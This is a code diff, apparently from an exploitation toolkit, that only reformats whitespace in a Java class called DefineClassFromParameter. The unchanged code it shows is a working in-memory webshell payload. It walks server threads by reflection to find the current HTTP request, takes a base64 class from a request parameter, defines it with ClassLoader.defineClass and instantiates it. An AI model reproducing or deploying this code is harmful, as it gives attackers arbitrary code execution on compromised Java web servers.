@@ -11,9 +11,9 @@ public class DefineClassFromParameter {
 
     static {
         try {
-            boolean                 flag  = false;
-            ThreadGroup             group = Thread.currentThread().getThreadGroup();
-            java.lang.reflect.Field f     = group.getClass().getDeclaredField("threads");
+            boolean flag = false;
+            ThreadGroup group = Thread.currentThread().getThreadGroup();
+            java.lang.reflect.Field f = group.getClass().getDeclaredField("threads");
             f.setAccessible(true);
             Thread[] threads = (Thread[]) f.get(group);
             for (int i = 0; i < threads.length; i++) {
@@ -51,12 +51,12 @@ public class DefineClassFromParameter {
                         f = processor.getClass().getDeclaredField("req");
                         f.setAccessible(true);
 
-                        Object req     = f.get(processor);
-                        Object note    = req.getClass().getMethod("getNote", new Class[]{Integer.TYPE}).invoke(req, new Object[]{new Integer(1)});
+                        Object req = f.get(processor);
+                        Object note = req.getClass().getMethod("getNote", new Class[]{Integer.TYPE}).invoke(req, new Object[]{new Integer(1)});
                         String payload = (String) note.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(note, new Object[]{parameter});
                         if (payload != null && !payload.isEmpty()) {
-                            byte[]                   classBytes = base64Decode(payload);
-                            java.lang.reflect.Method method     = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
+                            byte[] classBytes = base64Decode(payload);
+                            java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                             method.setAccessible(true);
                             Class clazz = (Class) method.invoke(DefineClassFromParameter.class.getClassLoader(), classBytes, new Integer(0), new Integer(classBytes.length));
                             clazz.newInstance();
@@ -74,7 +74,7 @@ public class DefineClassFromParameter {
     }
 
     public static byte[] base64Decode(String bs) {
-        Class  base64;
+        Class base64;
         byte[] value = null;
         try {
             base64 = Class.forName("java.util.Base64");
